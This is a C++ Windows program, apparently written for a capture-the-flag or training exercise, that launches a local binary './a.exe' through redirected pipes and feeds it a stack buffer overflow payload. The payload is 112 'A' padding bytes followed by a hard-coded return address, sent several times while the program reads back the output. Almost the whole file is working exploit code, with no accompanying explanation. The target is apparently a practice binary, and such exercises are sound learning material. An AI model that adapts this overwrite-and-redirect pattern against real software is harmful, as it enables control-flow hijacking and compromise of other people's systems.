#include <windows.h> 
#include <tchar.h>
#include <stdio.h> 
#include <strsafe.h>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include <sstream>
#define BUFSIZE 8192

#include <chrono>
#include <thread>



HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;

void CreateChildProcess(void);
void WriteToPipe(const std::string&);
void WriteToPipe(char* buffer, unsigned int buffer_len);
//void ReadFromPipe(void);
std::string ReadFromPipe(void);
void ErrorExit(PCTSTR);
unsigned int p32(uint32_t value);
unsigned int writeAddressToBuffer(char* buffer, unsigned int buffer_append_pos, uint32_t value);

void createFile(const std::string& filename) {
    std::ifstream file(filename);
    if (!file) {
        // File doesn't exist, so create it
        std::ofstream newFile(filename);
        if (newFile) {
            std::cout << "File created successfully: " << filename << std::endl;
        }
        else {
            std::cout << "Failed to create the file: " << filename << std::endl;
        }
    }
    else {
        // File exists
        std::cout << "File already exists: " << filename << std::endl;
    }
}

int _tmain(int argc, TCHAR* argv[])
{


    SECURITY_ATTRIBUTES saAttr;

    printf("\n->Start of parent execution.\n");

    // Set the bInheritHandle flag so pipe handles are inherited. 

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT. 

    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
        ErrorExit(TEXT("StdoutRd CreatePipe"));

    // Ensure the read handle to the pipe for STDOUT is not inherited.

    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdout SetHandleInformation"));

    // Create a pipe for the child process's STDIN. 

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
        ErrorExit(TEXT("Stdin CreatePipe"));

    // Ensure the write handle to the pipe for STDIN is not inherited. 

    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
        ErrorExit(TEXT("Stdin SetHandleInformation"));

    // Create the child process. 

    CreateChildProcess();

    std::string answer;
    std::string readData;
    std::string word;
    std::vector<std::string> words;

    //------------------start---------------------------
    char buffer[4096];
    unsigned int buf_len;
    //write to the required buffer
    std::string As(112,'A');
    snprintf(buffer, sizeof(buffer), As.c_str());
    // add the address of the value
    unsigned int address = 0x00401460;
    unsigned int buffer_append_pos = strlen(buffer);

    buffer_append_pos = writeAddressToBuffer(buffer, buffer_append_pos, p32(address));

    printf("p32 address %X\n", p32(address));

    WriteToPipe(buffer, buffer_append_pos);
    WriteToPipe("A\n");
    readData = ReadFromPipe();
    std::cout << readData << std::endl;
    WriteToPipe(buffer, buffer_append_pos);
    WriteToPipe("A\n");
    WriteToPipe(buffer, buffer_append_pos);
    WriteToPipe("A\n");
    readData = ReadFromPipe();
    std::cout << readData << std::endl;
    readData = ReadFromPipe();
    std::cout << readData << std::endl;

    std::this_thread::sleep_for(std::chrono::milliseconds(10000));


    return 0;
}

void CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{
    TCHAR szCmdline[] = TEXT("./a.exe"); 
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure. 

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr; // Would like the child process to stdout to a file
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

    // If an error occurs, exit the application. 
    if (!bSuccess)
        ErrorExit(TEXT("CreateProcess"));
    else
    {
        // Close handles to the child process and its primary thread.
        // Some applications might keep these handles to monitor the status
        // of the child process, for example. 

        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        // Close handles to the stdin and stdout pipes no longer needed by the child process.
        // If they are not explicitly closed, there is no way to recognize that the child process has ended.

        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

void WriteToPipe(const std::string& str) {
    // send the value to the pipe
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    strncpy_s(chBuf, str.c_str(), BUFSIZE - 1);  // Ensure null-termination
    chBuf[BUFSIZE - 1] = '\0';  // Ensure null-termination in case the string is longer than BUFSIZE
    //printf("this is the sent value: %s", chBuf);
    bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL);
    if (!bSuccess) return;
}
void WriteToPipe(char* buffer, unsigned int buffer_len){
    DWORD dwRead, dwWritten;
    BOOL bSuccess = FALSE;
    bSuccess = WriteFile(g_hChildStd_IN_Wr, buffer, buffer_len, &dwWritten, NULL);
    if (!bSuccess) return;
}

std::string ReadFromPipe(void) {
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE] = "\0";
    BOOL bSuccess = FALSE;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
    if (!bSuccess || dwRead == 0) return chBuf;
    //printf("%s \n", chBuf);
    return std::string(chBuf);
}

void ErrorExit(PCTSTR lpszFunction)

// Format a readable error message, display a message box, 
// and exit from the application.
{
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction, dw, lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(1);
}

unsigned int p32(uint32_t value) { 
    unsigned int littleEndianValue =
        (value & 0xFF) << 24 |       // Low byte
        ((value >> 8) & 0xFF) << 16 | // 2nd byte
        ((value >> 16) & 0xFF) << 8 | // 3rd byte
        ((value >> 24) & 0xFF);      // High byte

    return littleEndianValue;
}

unsigned int writeAddressToBuffer(char  *buffer,unsigned int buffer_append_pos, uint32_t value) {
    buffer[buffer_append_pos++] = ((value >> 24) & 0xFF);  
    buffer[buffer_append_pos++] = ((value >> 16) & 0xFF);  
    buffer[buffer_append_pos++] = ((value >> 8) & 0xFF);   
    buffer[buffer_append_pos++] = (value & 0xFF);          
    
    
    
    return buffer_append_pos;
}